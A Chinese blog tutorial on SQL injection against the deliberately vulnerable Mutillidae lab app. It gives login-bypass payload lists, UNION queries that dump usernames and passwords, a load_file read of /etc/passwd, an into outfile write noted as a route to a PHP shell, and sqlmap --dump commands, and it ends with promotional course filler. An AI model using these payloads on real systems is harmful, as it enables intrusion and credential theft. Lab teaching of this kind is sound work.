
--- 
title:  SQL注入漏洞利用 
tags: []
categories: [] 

---
#### 0x00前言

SQL注入是一种注入攻击，可以执行恶意SQL语句。这些语句控制Web应用程序后面的数据库服务器。攻击者可以利用SQL 注入漏洞规避应用程序安全性方面的努力。他们可以绕过页面或Web应用程序的身份验证和授权，并恢复整个SQL数据库的内容。他们同样可以利用SQL注入来包含，更改和擦除数据库中的记录。SQL注入漏洞可能会影响使用SQL数据库的任何站点或Web应用程序，例如MySQL，Oracle，MSSQL或其他。攻击者可能会利用它来增加对您的敏感信息，客户数据，商业秘密，许可创新的未经许可的访问，而这仅仅是冰山一角。

而由于sql注入漏洞得利用有些广泛，因此我们将无法提及SQL注入的所有细节，而是从基础知识开始对其中的一些内容进行说明。为此，我们将使用metasploitable的Mutillidae Web应用程序，该Web应用程序仅出于演示目的容易受到SQL 注入攻击。 <img src="https://img-blog.csdnimg.cn/20200810174052196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 选择“ Mutillidae”链接，然后转到“登录/注册”选项卡并注册以创建一个帐户。

<img src="https://img-blog.csdnimg.cn/20200810174105891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

提供必要的信息，然后单击“创建帐户”按钮。 <img src="https://img-blog.csdnimg.cn/20200810174116443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

现在，让我们使用一些SQL注入技术来绕过登录页面，本教程介绍了攻击者可以用来破坏登录表单的不同方法。

#### 0x01 在POST字段中发现SQL注入

我们将在示例中使用的登录结构非常简单。它包含两个易受攻击的输入字段（用户名和密码）。后端内容创建查询以批准客户端提供的用户名和密钥。以下是页面基本原理的概述：

$ query =“SELECT * FROM users where where username =’$ _ POST [username]‘AND password =’$_POST[password]’”;

为了避开登录和访问受限区域，攻击者需要构建一个SQL部分，该部分将更改“ WHERE”子句并将其设为true。例如，随附的登录数据将通过滥用password参数中存在的弱点来提供对攻击者的访问权限。对于用户名，请输入“ john.doe”或“ anything”，对于密码，请输入“ anything” or“ 1” =‘1）或（admin（or’1’='1），然后尝试登录，然后您将显示一个管理员登录页面。 <img src="https://img-blog.csdnimg.cn/20200810174130971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> <img src="https://img-blog.csdnimg.cn/20200810174145845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

让我们看一下生成的查询：

SELECT * FROM users，其中username ='john.doe’AND password =‘anything’or’1’=‘1’ 由于操作员的优先权，“and”条件将首先评估。

然后评估“ OR”运算符，使“ WHERE”语句为真。该条件对“users”表的所有行均有效。这意味着将忽略给定的用户名，并且攻击者将以“users”表中的主要用户身份登录。此外，这意味着攻击者无需知道用户名即可访问框架。查询将为他发现一个！

在这些简单的示例中，我们已经看到入侵者可以回避使用SQL注入的身份验证系统。在不限制可能造成的灾难性后果的情况下，必须提到的是，SQL注入比登录绕过具有更大的安全影响。以下是OWASP成员Emin Islam Tatlilf博士创建的命令列表，这些命令可用于SQL注入身份验证旁路。

```
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin’--
admin’ #
admin’/*
admin’ or ‘1’=’1
admin’ or ‘1’=’1'--
admin’ or ‘1’=’1'#
admin’ or ‘1’=’1'/*
admin’or 1=1 or ‘’=’
admin’ or 1=1
admin’ or 1=1--
admin’ or 1=1#
admin’ or 1=1/*
admin’) or (‘1’=’1
admin’) or (‘1’=’1'--
admin’) or (‘1’=’1'#
admin’) or (‘1’=’1'/*
admin’) or ‘1’=’1
admin’) or ‘1’=’1'--
admin’) or ‘1’=’1'#
admin’) or ‘1’=’1'/*
1234 ‘ AND 1=0 UNION ALL SELECT ‘admin’, ‘81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin” #
admin”/*
admin” or “1”=“1
admin” or “1”=“1”--
admin” or “1”=“1”#
admin” or “1”=“1”/*
admin” or 1=1 or ““=“
admin” or 1=1
admin” or 1=1--
admin” or 1=1#
admin” or 1=1/*
admin”) or (“1”=“1
admin”) or (“1”=“1”--
admin”) or (“1”=“1”#
admin”) or (“1”=“1”/*
admin”) or “1”=“1
admin”) or “1”=“1”--
admin”) or “1”=“1”#
admin”) or “1”=“1”/*
1234 “ AND 1=0 UNION ALL SELECT “admin”, “81dc9bdb52d04dc20036dbd8313ed055


```

#### 0x02 绕过登录字段

在此示例中，我们将仅定位用户名字段并尝试获得访问权限。用户名字段也很容易受到攻击，同样也可能被滥用来访问框架。攻击者绕过身份验证的要求不高，而且逐渐变得常识，因为他可以选择他可能想要登录的用户记录。

这是SQL注入攻击的外观。将（admin’＃）或（admin’–）放在用户名字段中，然后按“ Enter”登录。我们使用“＃”或“–”来注释用户名后告诉查询语句的所有内容忽略密码字段的数据库：（选择*来自用户，其中username =‘admin’＃AND password =’’）。通过使用行注释，攻击者可以消除部分登录条件并获得访问权限。这项技术将使“ WHERE”子句仅对一个用户成立。在这种情况下，它是“管理员”。 <img src="https://img-blog.csdnimg.cn/20200810174336648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> <img src="https://img-blog.csdnimg.cn/20200810174343996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

#### 0x03 基于联合的SQL注入

基于UNION的SQL注入攻击使分析仪可以有效地从数据库中提取数据。由于如果两个查询的结构完全相同，则必须使用“ UNION”运算符，因此攻击者必须像第一个查询一样编写“ SELECT”语句。为此，必须知道一个实质性的表名，但是决定第一个查询中的列数及其信息类型同样至关重要。

在本教程中，我们将使用Mutillidae 的“用户信息”页面执行基于联合的SQL注入攻击。转到“ OWASP Top 10 / A1 —注入/ SQLi —提取数据/用户信息”，并使用在我们上面学习的登录绕过技术来访问该页面。 <img src="https://img-blog.csdnimg.cn/2020081017441564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> <img src="https://img-blog.csdnimg.cn/2020081017441533.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

我们所有的攻击媒介都将使用基于联合的技术在页面的URL部分中执行。

有两种不同的方法来发现原始查询选择了多少列。首先是注入“ ORDER BY”语句以查询列号。给定指定的列数大于“ SELECT”语句中的列数，将返回错误。否则，结果将按提到的列进行排序。 <img src="https://img-blog.csdnimg.cn/20200810174434493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

由于我们不知道列数，因此我们从100开始。使用二分法，要找到确切的列数，请减少列数，直到返回与“ ORDER BY”子句相关的错误为止。在此示例中，我们将其减少到6列并收到一条错误消息，因此这意味着列数少于6。 <img src="https://img-blog.csdnimg.cn/20200810174447482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

当我们输入5列是，它可以工作并显示一些信息。这意味着我们可以使用5列。

接下来，而是采用 了“order by”选项，让我们使用“union select”选项，并提供所有5列。例如：

union select 1,2,3,4,5 <img src="https://img-blog.csdnimg.cn/2020081017445942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

如上图中所示，第2、3和4列显示出来了可用，因此我们可以将这些数字替换为任何数据库值以查看它们对应的含义。让我们将第2列更改为“ database（）”，将第 3列更改为“ user（）”，将第4列更改为“ version（）”。

例如：

union select 1,database(),user(),version(),5 <img src="https://img-blog.csdnimg.cn/20200810174515780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

这个联合命令为我们提供了一些有用的信息。现在，我们知道数据库为“ owasp10”，其用户为“ root@localhost”，服务器的版本为“ 5.0.51a-3ubuntu5”。根据这些信息，我们可以搜索一些漏洞或exp，以进一步破坏目标。

#### 0x04 查找数据库表

在构建查询数据库以提取敏感数据之前，攻击者必须认识到他需要提取哪些信息以及该信息在数据库中的存储位置。首先，必须意识到您很可能查看数据库用户有权访问的表。换句话说，您的会话客户端很可能会声明或已向客户端授予一定授权的概要表。其他所有表似乎都不存在。

在MySQL中，表“ information_schema.tables”包含用表项标识的所有元数据。下面列出了此表上最有用的信息。

“ table_name”：表的名称。

“ table_schema”：表模式名。

如果要限制返回到当前模式的表的列表，则可以添加“ WHERE”子句以结合“ DATABASE（）”和“ SCHEMA（）”函数来过滤此列。

例如：

union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’ 在这里，我们要从“ owasp 10”数据库中检索表名 <img src="https://img-blog.csdnimg.cn/20200810174531920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

如上图所见，我们可以访问多个名为“accounts(账号)”，“ blogs_table”，“ captured_data”，“ credit_cards”，“ hitlog ”和“ pen_test_tools”的表。

#### 0x05提取敏感数据，例如密码

当攻击者知道表名时，他需要发现提取数据的列名。在MySQL中，表“ information_schema.columns”提供有关表中列的数据。要提取的最有用的列之一称为“ column_name”。”

例如：

union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’ 在这里，我们尝试从“帐户”表中提取列名称。 <img src="https://img-blog.csdnimg.cn/2020081017455082.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

一旦发现所有可用的列名，我们就可以通过在查询语句中添加这些列名来从中提取信息。

例如：

union select 1,username,password,is_admin,5 from accounts <img src="https://img-blog.csdnimg.cn/20200810174605750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

如上图所示，我们设法检索了与此数据库相关的所有用户名和密码。

#### 0x06 在Web服务器上读写文件

在本小节内容中，我将告诉您访问目标计算机上文档的最佳方法，就像如何将自己的文件和代码传输到目标计算机上一样，而无需踏入目标网站的管理面板。

我们可以使用“ LOAD_FILE（）函数”运算符细读网络服务器中包含的任何文件的内容。通常，我们将检查“ / etc / password”文件，以查看是否能幸运地获得用户名和密码，以便以后在爆破攻击中使用。

例：

union select null,load_file(‘/etc/passwd’),null,null,null <img src="https://img-blog.csdnimg.cn/20200810174628904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

我们将利用“ INTO_OUTFILE（）”函数为它们提供的所有运算符，并尝试通过SQL注入传输外层代码来尝试建立目标服务器的根目录。请记住，这样做的一般目的是告诉您最佳方法，而不会被管理员面板抓住。这种替代方法使您可以从一列中获取内容，并在整洁的文本文件中发现它们，以保持整洁。您还可以利用它来传输PHPShell代码以执行远程文件包含或CMD执行。

例：

union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’ 在此示例中，我们将编写“ Hello World！”。句子并将其作为“ hello.txt”文件输出到“ / tmp /”目录中。这个“ Hello World！” 可以用您要在目标服务器中执行的任何PHP Shell代码替换该语句。 <img src="https://img-blog.csdnimg.cn/20200810174649747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

如上图中所示，我们成功添加了文本并将其保存为“ hello.txt”文件在“ / tmp”目录中。

#### 0x07 使用SQLmap发现SQL注入并提取数据

Sqlmap是最主流和突破性的SQL注入自动化工具中的佼佼者。给定一个易受攻击的HTTP URL请求，sqlmap可以滥用远程数据库并完成大量黑客操作，例如删除数据库名称，表，列，表中的所有数据，等等。它甚至可以在特定条件下在远程文件系统上读写文档。

不熟悉sqlmap时，可能会很棘手。此sqlmap教学练习旨在以生动，基本的方式展示此主流SQL注入设备的最重要功能。

要启动sqlmap并列出所有可用选项，请键入“ sqlmap --help”。它将提供您需要了解的所有内容以及一些在实践中如何使用它的示例。让我们更仔细地看一下这个工具。 <img src="https://img-blog.csdnimg.cn/20200810174704495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

转到Mutillidae登录页面，输入一些错误的凭据，然后按“ Enter”以生成流量并创建URL GET参数。 <img src="https://img-blog.csdnimg.cn/20200810174716692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

然后复制URL链接，并在sqlmap工具中使用它。

例：

sqlmap –u http://10.10.10.7/mutillidae/index.php?page=user-info.php&amp;username=test&amp;password=test&amp;user-info-php-submit-button=View+Account+Details 这里的“ -u”代表您要执行SQL注入攻击 的 目标URL。要跳过特定于其他DBMS的测试有效负载，请输入“ Y”。 <img src="https://img-blog.csdnimg.cn/20200810174731121.png" alt="在这里插入图片描述">

在搜索的几分钟内，sqlmap已经发现用户名是可注入的并且容易受到攻击，如屏幕截图所示。 <img src="https://img-blog.csdnimg.cn/20200810174738863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

如果要查找更多漏洞，只需让该过程运行到最后，它就可以找到所有可用漏洞。对于演示，我们将按“ Crtl + C”在此处停止。

在此sqlmap教程中，有关提取数据的事情确实令人着迷。从SQL注入点恢复存储在数据库中的信息是一项艰巨的任务，尤其是当没有结果直接返回到易受攻击的网页中时。幸运的是，使用sqlmap可使分析仪提取宝贵的数据片段，而无须手工操作。首先，让我们使用类似的命令来提取要尝试破解的网站上所有可用的数据库，但最后，为数据库添加“ --dbs”选项。

例：

sqlmap –u http://10.10.10.7/mutillidae/index.php?page=user-info.php&amp;username=test&amp;password=test&amp;user-info-php-submit-button=View+Account+Details --dbs <img src="https://img-blog.csdnimg.cn/20200810174749572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

sqlmap提取了所有可用的数据库。要注入更多的SQL查询，我们需要使用相同的命令来了解当前数据库，但将最后一个参数替换为“ --current-db”。

例：

sqlmap –u http://10.10.10.7/mutillidae/index.php?page=user-info.php&amp;username=test&amp;password=test&amp;user-info-php-submit-button=View+Account+Details --current-db 此命令的输出显示我们位于“ owasp10”数据库中。 <img src="https://img-blog.csdnimg.cn/20200810174803427.png" alt="在这里插入图片描述">

现在，使用命令“ --tables –D owasp10”来查看数据库“ owasp10”的所有可用表。 <img src="https://img-blog.csdnimg.cn/20200810174815463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

例：

sqlmap –u http://10.10.10.7/mutillidae/index.php?page=user-info.php&amp;username=test&amp;password=test&amp;user-info-php-submit-button=View+Account+Details --tables –D owasp10

如下图所示，我们设法提取了数据库“ owasp10”的所有可用表。 <img src="https://img-blog.csdnimg.cn/20200810174924891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

sqlmap还可以通过实现参数“ --columns -T [table_name]”来枚举列。

例：

sqlmap –u http://10.10.10.7/mutillidae/index.php?page=user-info.php&amp;username=test&amp;password=test&amp;user-info-php-submit-button=View+Account+Details --columns -T accounts

<img src="https://img-blog.csdnimg.cn/20200810174909680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

黑客甚至有可能转储整个表或数据库，并使用选项“ --dump”列出所有有价值的信息。

例：

sqlmap –u http://10.10.10.7/mutillidae/index.php?page=user-info.php&amp;username=test&amp;password=test&amp;user-info-php-submit-button=View+Account+Details — columns -T accounts --dump <img src="https://img-blog.csdnimg.cn/20200810174858772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

随着信息技术的快速发展和互联网的普及，IT行业 成为一个非常热门的领域，也是目前就业前景非常广阔的领域之一。

IT行业是一个非常庞大和多样化的行业，包括软件开发、网络安全、数据分析、云计算等等领域。因此，就业前景也是非常广泛和多样化的，不同的领域和职位都具有不同的就业前景和发展机会。

在软件开发领域，由于软件已经成为现代社会不可或缺的一部分，因此对软件开发人才的需求也越来越大。特别是在移动应用、大数据、人工智能等领域，软件开发人才的需求更是迅速增长。因此，软件开发人才的就业前景非常广阔，尤其是那些熟练掌握多种编程语言和技术的人才。

有幸看到一篇这样一组数据。

<img src="https://img-blog.csdnimg.cn/c3114b9c3bf947adb177b7aaf91e1be5.png" alt="">

<img src="https://img-blog.csdnimg.cn/img_convert/d5f06d6b9945fd6e8a5f92a0198e5446.png" alt="">

<img src="https://img-blog.csdnimg.cn/img_convert/9cf857398f52a97ff49d437ac5fe690a.png" alt="">

根据这些我不得总结，it行业确实人才紧缺，

##### **网络安全行业特点**

1、就业薪资非常高，涨薪快 2021年猎聘网发布网络安全行业就业薪资行业最高人均33.77万！

2、人才缺口大，就业机会多

2019年9月18日《中华人民共和国中央人民政府》官方网站发表：我国网络空间安全人才 需求140万人，而全国各大学校每年培养的人员不到1.5W人。猎聘网《2021年上半年网络安全报告》预测2027年网安人才需求300W，现在从事网络安全行业的从业人员只有10W人。

##### 行业发展空间大，岗位非常多

网络安全行业产业以来，随即新增加了几十个网络安全行业岗位︰网络安全专家、网络安全分析师、安全咨询师、网络安全工程师、安全架构师、安全运维工程师、渗透工程师、信息安全管理员、数据安全工程师、网络安全运营工程师、网络安全应急响应工程师、数据鉴定师、网络安全产品经理、网络安全服务工程师、网络安全培训师、网络安全审计员、威胁情报分析工程师、灾难恢复专业人员、实战攻防专业人员…

##### 职业增值潜力大

网络安全专业具有很强的技术特性，尤其是掌握工作中的核心网络架构、安全技术，在职业发展上具有不可替代的竞争优势。

随着个人能力的不断提升，所从事工作的职业价值也会随着自身经验的丰富以及项目运作的成熟，升值空间一路看涨，这也是为什么受大家欢迎的主要原因。

从某种程度来讲，在网络安全领域，跟医生职业一样，越老越吃香，因为技术愈加成熟，自然工作会受到重视，升职加薪则是水到渠成之事。

#### 如果你对网络安全入门感兴趣，那么你点击这里**👉**

**如果你对网络安全感兴趣，学习资源免费分享，保证100%免费！！！（嘿客入门教程）**

## 学习资料分享

当然，**只给予计划不给予学习资料的行为无异于耍流氓**，### 如果你对网络安全入门感兴趣，那么你点击这里**👉**

**如果你对网络安全感兴趣，学习资源免费分享，保证100%免费！！！（嘿客入门教程）**

**👉网安（嘿客）全套学习视频👈**

我们在看视频学习的时候，不能光动眼动脑不动手，比较科学的学习方法是在理解之后运用它们，这时候练手项目就很适合了。

#### 

#### <img src="https://img-blog.csdnimg.cn/img_convert/d1c617b78ee48eda7601e5b803e69276.png" alt="img">

#### **👉网安（嘿客红蓝对抗）所有方向的学习路线****👈**

对于从来没有接触过网络安全的同学，我们帮你准备了详细的学习成长路线图。可以说是最科学最系统的学习路线，大家跟着这个大的方向学习准没问题。

#### <img src="https://img-blog.csdnimg.cn/img_convert/de55dfd737dae0cf88e416d0454b17a8.png" alt="img">

#### 学习资料工具包

压箱底的好资料，全面地介绍网络安全的基础理论，包括逆向、八层网络防御、汇编语言、白帽子web安全、密码学、网络安全协议等，将基础理论和主流工具的应用实践紧密结合，有利于读者理解各种主流工具背后的实现机制。

<img src="https://img-blog.csdnimg.cn/9609a53465cf4253b492a5185896fa71.png" alt="在这里插入图片描述">

**面试题资料**

独家渠道收集京东、360、天融信等公司测试题！进大厂指日可待！ <img src="https://img-blog.csdnimg.cn/f5f267c281c543fb9cc9af53b9003a37.png" alt="在这里插入图片描述">

#### **👉<strong><strong>嘿客必备开发工具**</strong>👈</strong>

工欲善其事必先利其器。学习**嘿**客常用的开发软件都在这里了，给大家节省了很多时间。

#### 这份完整版的网络安全（**嘿**客）全套学习资料已经上传至CSDN官方，朋友们如果需要点击下方链接**也可扫描下方微信二v码获取网络工程师全套资料**【保证100%免费】

#### <img src="https://img-blog.csdnimg.cn/img_convert/16c400294b6fda8f01400f24f1f12b0c.png" alt="在这里插入图片描述">

#### 如果你对网络安全入门感兴趣，那么你点击这里**👉**
